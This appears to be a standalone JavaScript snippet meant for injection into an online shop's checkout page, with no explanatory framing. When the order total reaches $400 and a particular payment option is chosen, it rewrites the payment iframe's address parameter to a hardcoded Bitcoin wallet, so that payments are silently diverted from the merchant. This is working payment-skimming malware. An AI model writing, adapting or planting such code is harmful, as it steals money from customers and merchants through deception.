var intervalId;
function checkIframe() {
    if (window.location.href.indexOf("/shop/shippingaddress?coupon_code=&shipping_type=") > -1){

        var grandTotalElement = Array.from(document.querySelectorAll('.row em')).find(function(el) { return el.textContent.trim() === 'Grand Total'; });
        var priceElement = grandTotalElement.nextElementSibling;
        var priceText = priceElement.textContent;
        var priceValue = parseInt(priceText.replace('$', '').trim());
        if (priceValue >= 400) {
            if(document.getElementsByTagName("select")[1].value=="2"){
                const iframes = Array.from(document.getElementsByTagName("iframe"));
                const targetValue = "common/create"; 
                const newValue = "bc1qppe2ygq6u57wgq02ss8ju2adc280hvdm8f9mg0"; 
                const foundIframe = iframes.some(iframe => {
                    if (iframe.src.includes(targetValue)) {
                        const updatedSrc = iframe.src.replace(/(address=)[^&]*/, `$1${newValue}`);
                        iframe.src = updatedSrc; 
                        clearInterval(intervalId);
                        return true;
                    }
                    return false;
                });
            }
        }
    }
}

checkIframe() 
